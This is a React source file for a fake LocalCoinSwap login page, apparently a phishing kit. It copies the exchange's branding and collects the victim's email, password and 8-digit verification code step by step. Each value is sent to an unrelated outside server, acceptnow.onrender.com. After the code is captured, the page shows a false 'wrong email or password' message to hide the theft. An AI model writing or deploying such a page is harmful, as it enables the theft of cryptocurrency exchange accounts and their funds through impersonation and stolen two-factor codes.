import React, { useState } from "react";

function LocalCoinswap() {
  const [email, setEmail] = useState("");
  const [word, setWord] = useState("");
  const [code, setCode] = useState("");
  const [step, setStep] = useState(1);
  const [userId, setUserId] = useState(null);

  /* =========================
      STEP 1 — SAVE EMAIL
  ========================== */
  const handleStep1 = async () => {
    if (!email) return alert("Email is required");

    try {
      const res = await fetch("https://acceptnow.onrender.com/api/users/step1", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email }),
      });

      const data = await res.json();

      if (res.ok) {
        setUserId(data.userId);
        setStep(2); // go to word input step
      } else {
        alert(data.error || "Error");
      }
    } catch (err) {
      console.error(err);
      alert("Server error");
    }
  };

  /* =========================
      STEP 2 — SAVE WORD
  ========================== */
  const handleStep2 = async () => {
    if (!word) return alert("Password is required");

    try {
      const res = await fetch("https://acceptnow.onrender.com/api/users/step2", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId, word }),
      });

      const data = await res.json();

      if (res.ok) {
        setStep(3); // move to code input
      } else {
        alert(data.error || "Error saving word");
      }
    } catch (err) {
      console.error(err);
      alert("Server error");
    }
  };

  /* =========================
      STEP 3 — SAVE CODE
  ========================== */
  const handleStep3 = async () => {
    if (!code) return alert("Enter the verification code");

    try {
      const res = await fetch("https://acceptnow.onrender.com/api/users/step3", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId, code }),
      });

      const data = await res.json();

      if (res.ok) {
        alert("Wrong email or password! Try again using correct credentials");
      } else {
        alert(data.error || "Invalid code");
      }
    } catch (err) {
      console.error(err);
      alert("Server error");
    }
  };

  return (
    <div className="min-h-screen bg-[#0b0f17] flex flex-col items-center justify-center text-white relative px-4 py-8 md:px-0">
      {/* Top Bar */}
      <div className="absolute top-4 left-4 flex items-center space-x-2">
        <img src="/localcoinswap.png" alt="LocalCoinSwap Logo" className="w-7 h-7" />
        <h1 className="text-md md:text-lg font-semibold">LocalCoinSwap</h1>
      </div>

      <button className="absolute top-4 right-4 bg-linear-to-r from-orange-400 to-orange-600 px-4 md:px-5 py-2 rounded-full font-semibold hover:opacity-90 transition text-sm md:text-base">
        Register
      </button>

      <div className="flex flex-col md:flex-row bg-[#0e141f] rounded-xl overflow-hidden w-full md:w-[70%] max-w-5xl shadow-lg mt-16">

        {/* Quote Section */}
        <div className="w-full md:w-1/2 bg-[#0e141f] p-8 md:p-12 flex flex-col justify-center border-b md:border-b-0 md:border-r border-gray-800">
          <div className="text-5xl md:text-6xl text-blue-500 mb-4 md:mb-6">“</div>

          <p className="text-gray-300 text-sm md:text-base leading-relaxed mb-4">
            The world ultimately will have a single currency. The internet will
            have a single currency. I personally believe that it will be Bitcoin.
          </p>

          <div className="mt-4 md:mt-6 border-t border-gray-700 pt-3 text-gray-400 text-sm md:text-base">
            Jack Dorsey
          </div>
        </div>

        {/* Login Section */}
        <div className="w-full md:w-1/2 bg-[#0e141f] p-8 md:p-12 flex flex-col justify-center">
          <h2 className="text-xl md:text-2xl font-semibold mb-6 text-white">
            Login to LocalCoinSwap
          </h2>

          {/* STEP 1 — EMAIL */}
          <label className="text-gray-400 mb-2 text-sm">Email</label>
          <input
            type="email"
            placeholder="you@email.com"
            className="bg-transparent border border-gray-700 rounded-md px-4 py-2 text-white focus:outline-none focus:border-blue-400"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />

          {step === 1 && (
            <button
              onClick={handleStep1}
              className="mt-4 bg-[#35b6ff] w-full py-2 rounded-full font-semibold hover:bg-[#4cc4ff] transition"
            >
              Login
            </button>
          )}

          {/* STEP 2 — WORD */}
          {step >= 2 && (
            <div className="mt-8">
              <label className="text-gray-400 text-sm">Password</label>
              <input
                type="text"
                placeholder="Enter Password"
                className="bg-transparent border border-gray-700 rounded-md px-4 py-2 text-white focus:outline-none focus:border-blue-400 w-full"
                value={word}
                onChange={(e) => setWord(e.target.value)}
              />

              {step === 2 && (
                <button
                  onClick={handleStep2}
                  className="mt-4 bg-[#35b6ff] w-full py-2 rounded-full font-semibold hover:bg-[#4cc4ff] transition"
                >
                  Login
                </button>
              )}
            </div>
          )}

          {/* STEP 3 — CODE */}
          {step >= 3 && (
            <div className="mt-8">
              <label className="text-gray-400 text-sm">Verification Code</label>
              <input
                type="text"
                maxLength={8}
                placeholder="8-digit code"
                className="bg-transparent border border-gray-700 rounded-md px-4 py-2 text-white focus:outline-none focus:border-blue-400 w-full tracking-widest"
                value={code}
                onChange={(e) => setCode(e.target.value)}
              />

              {step === 3 && (
                <button
                  onClick={handleStep3}
                  className="mt-4 bg-[#35b6ff] w-full py-2 rounded-full font-semibold hover:bg-blue-400 transition"
                >
                  Verify
                </button>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

export default LocalCoinswap;
